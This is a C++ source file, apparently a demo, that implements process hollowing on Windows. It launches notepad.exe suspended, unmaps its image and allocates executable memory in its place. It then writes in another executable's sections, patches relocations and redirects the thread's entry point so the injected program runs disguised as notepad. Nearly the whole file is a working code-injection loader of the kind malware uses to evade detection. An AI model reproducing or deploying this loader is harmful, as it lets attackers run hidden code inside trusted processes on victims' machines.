// ProcessHollowing.cpp : Defines the entry point for the console application.


#include <windows.h>
#include <stdio.h>

#include <winternl.h>

typedef struct _PEB* PPEB;
typedef LONG KPRIORITY;

typedef struct _PROCESS_BASIC_INFORMATION2 {
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION2, * PPROCESS_BASIC_INFORMATION2;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef NTSTATUS(*_NtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

const char* g_toHollow = "xxx\\Desktop\\notepadfolder\\notepad.exe";
const char* g_toInject = "xxx\source\\repos\\Demos\\x64\\Debug\\example.exe";

int main() {
	LPSTARTUPINFOA si = new STARTUPINFOA();
	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	bool created = CreateProcessA(NULL, (LPSTR)g_toHollow, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, si, pi);
	if (!created)
	{
		printf("[-] Failed to create process!\n");
		return -1;
	}

	printf("[+] Process ID : %d\n", pi->dwProcessId);
	printf("[+] Unmapping the process\n");

	PROCESS_BASIC_INFORMATION2 pbi;
	DWORD returnLength;
	HMODULE jo = LoadLibrary(L"ntdll.dll");
	_NtQueryInformationProcess myNtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(jo, "NtQueryInformationProcess");
	myNtQueryInformationProcess(pi->hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);

	printf("[+] PEB : %p\n", pbi.PebBaseAddress);

	LPVOID dImageBase = 0;
	SIZE_T fileBytesRead = 0;
	SIZE_T bytesRead = NULL;
	ULONG_PTR ImageBaseOffset = (ULONG_PTR)pbi.PebBaseAddress + 16;

	ReadProcessMemory(pi->hProcess, (LPCVOID)ImageBaseOffset, &dImageBase, 8, &bytesRead);
	printf("[+] Image base : %p\n", dImageBase);
	printf("[+] Image base Offset : %p\n", ImageBaseOffset);

	HANDLE hToInject = CreateFileA(g_toInject, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hToInject == INVALID_HANDLE_VALUE) {
		printf("\nError: Unable to open file with error %d\n", GetLastError());
		return -1;
	}
	DWORD toInjectSize = GetFileSize(hToInject, NULL);
	PBYTE toInjectImage = new BYTE[toInjectSize];

	printf("Mapping File To Memory. [%s]. Size: %d\n", g_toInject, toInjectSize);
	DWORD readbytes;
	if (!ReadFile(hToInject, toInjectImage, toInjectSize, &readbytes, NULL)) {
		printf("\nError: Unable to read the replacement executable. ReadFile failed with error %d\n", GetLastError());
		return -1;
	}

	printf("[+] View unmapped\n");

	PIMAGE_DOS_HEADER sourceDosHeader = (PIMAGE_DOS_HEADER)toInjectImage;
	PIMAGE_NT_HEADERS64 sourceNtHeaders = (PIMAGE_NT_HEADERS64)((ULONG_PTR)toInjectImage + sourceDosHeader->e_lfanew);
	SIZE_T sourceImageSize = sourceNtHeaders->OptionalHeader.SizeOfImage;


	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	myNtUnmapViewOfSection(pi->hProcess, dImageBase);

	LPVOID newDestImageBase = VirtualAllocEx(pi->hProcess, dImageBase, sourceImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!newDestImageBase) {
		printf("[-] Couldn't allocate memory in process!\n");
		return -1;
	}
	dImageBase = newDestImageBase;

	printf("[+] Allocated memory! New Destination Image base: %p!\n", dImageBase);

	ULONG_PTR delta = (ULONG_PTR)dImageBase - sourceNtHeaders->OptionalHeader.ImageBase;

	sourceNtHeaders->OptionalHeader.ImageBase = (ULONG_PTR)dImageBase;
	BOOL res = WriteProcessMemory(pi->hProcess, dImageBase, toInjectImage,sourceNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
	if (!res) {
		printf("[-] Couldn't write header to the process memory!\n");
		return -1;
	}

	PIMAGE_SECTION_HEADER sourceImgSection = (PIMAGE_SECTION_HEADER)((ULONG_PTR)toInjectImage + sourceDosHeader->e_lfanew + sizeof(_IMAGE_NT_HEADERS64));
	PIMAGE_SECTION_HEADER prevSourceImgSection = sourceImgSection;
	int error = GetLastError();

	for (int i = 0; i < sourceNtHeaders->FileHeader.NumberOfSections; i++)
	{
		PVOID destSectionLocation = (PVOID)((ULONG_PTR)dImageBase + sourceImgSection->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((ULONG_PTR)toInjectImage + sourceImgSection->PointerToRawData);

		BOOL res = WriteProcessMemory(pi->hProcess, destSectionLocation, sourceSectionLocation, sourceImgSection->SizeOfRawData, NULL);
		if (!res) {
			printf("[-] Couldn't write section to the process memory!\n");
			return -1;
		}
		sourceImgSection++;
	}


	IMAGE_DATA_DIRECTORY relocTable = sourceNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

	sourceImgSection = prevSourceImgSection;
	for (int i = 0; i < sourceNtHeaders->FileHeader.NumberOfSections; i++)
	{
		char relocSectionName[]  = ".reloc";
		if (memcmp(sourceImgSection->Name, relocSectionName, strlen(relocSectionName))) {
			// If The Section Is Not The ".reloc" Section Conntinue To The Next Section
			sourceImgSection++;
			continue;
		}


		ULONG_PTR sourceRelocationTableRaw = sourceImgSection->PointerToRawData;
		ULONG_PTR relocOffset = 0;

		while (relocOffset < relocTable.Size)
		{
			PBASE_RELOCATION_BLOCK relocBlock = (PBASE_RELOCATION_BLOCK)((ULONG_PTR)toInjectImage + sourceRelocationTableRaw + relocOffset);
			printf("\nRelocation Block 0x%x. Size: 0x%x\n", relocBlock->PageAddress, relocBlock->BlockSize);


			relocOffset += sizeof(BASE_RELOCATION_BLOCK);

			DWORD relocEntryCount = (relocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocEntries = (PBASE_RELOCATION_ENTRY)((ULONG_PTR)toInjectImage + sourceRelocationTableRaw + relocOffset);
			printf("%d Entries Must Be Realocated In The Current Block.\n", relocEntryCount);

			for (DWORD y = 0; y < relocEntryCount; y++)
			{
				relocOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocEntries[y].Type == 0) {
					printf("The Type Of Base Relocation Is 0. Skipping.\n");
					continue;
				}


				ULONG_PTR patchAddress = relocBlock->PageAddress + relocEntries[y].Offset;
				ULONG_PTR patchedBuffer = 0;
				printf("[*] Patch Address: %p\n", patchAddress);
				BOOL res = ReadProcessMemory(pi->hProcess, (PVOID)((ULONG_PTR)dImageBase + patchAddress), &patchedBuffer, sizeof(ULONG_PTR), NULL);
				if (!res) {
					printf("[-] Couldn't read relocation in process memory! Code: %d\n", GetLastError());
					return -1;
				}
				printf("0x%llx --> 0x%llx | At:0x%llx\n", patchedBuffer, patchedBuffer + delta, (PVOID)((DWORD64)dImageBase + patchAddress));

				patchedBuffer += delta;

				res = WriteProcessMemory(pi->hProcess, (PVOID)((ULONG_PTR)dImageBase + patchAddress), &patchedBuffer, sizeof(ULONG_PTR), NULL);
				if (!res) {
					printf("[-] Couldn't write patched buffer to the process memory!\n");
					return -1;
				}
				error = GetLastError();
			}
		}
	}
	if (error != 0)
	{
		printf("[?] Error : %d\n", error);
		return -1;
	}

	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi->hThread, context);

	ULONG_PTR patchedEntryPoint = (ULONG_PTR)dImageBase + sourceNtHeaders->OptionalHeader.AddressOfEntryPoint;
	context->Rcx = patchedEntryPoint;
	printf("[+] Thread patched entrypoint : %p\n", patchedEntryPoint);

	SetThreadContext(pi->hThread, context);
	ResumeThread(pi->hThread);

	printf("[!] Done\n");
	getchar(); getchar();
}
